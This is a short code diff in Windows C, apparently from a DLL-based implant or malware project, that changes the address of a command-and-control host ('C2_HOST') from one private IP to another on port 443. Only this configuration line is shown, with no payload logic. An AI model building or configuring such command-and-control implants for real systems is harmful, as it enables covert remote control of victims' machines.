@@ -11,7 +11,7 @@
 #include <wchar.h>
 #include <tlhelp32.h>
 
-#define C2_HOST L"192.168.42.124"
+#define C2_HOST L"192.168.122.47"
 #define C2_PORT 443
 
 static HINSTANCE g_hDll    = NULL;
